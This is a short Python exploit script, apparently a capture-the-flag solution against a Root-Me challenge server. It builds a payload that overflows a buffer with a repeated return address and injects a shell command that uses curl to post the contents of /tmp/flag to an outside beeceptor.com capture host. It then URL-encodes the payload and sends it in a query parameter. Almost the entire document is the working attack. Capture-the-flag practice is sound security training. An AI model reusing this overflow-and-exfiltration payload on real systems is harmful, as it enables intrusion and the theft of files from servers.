import requests
import urllib.parse
from pwn import *

#payload = b'cp /flag/randomflagdockersayspouet.txt /tmp/flag\x00'
payload = b'curl -d @/tmp/flag https://spikeroot.free.beeceptor.com'
payload += b' '
payload += b'#'*(56-len(payload))
payload += p64(0x0061eb91)*10
encoded_payload = urllib.parse.quote_plus(payload)

print(encoded_payload)

r = requests.get("http://dyn-01.xmas.root-me.org:23318/?gown=" + encoded_payload, verify=False)
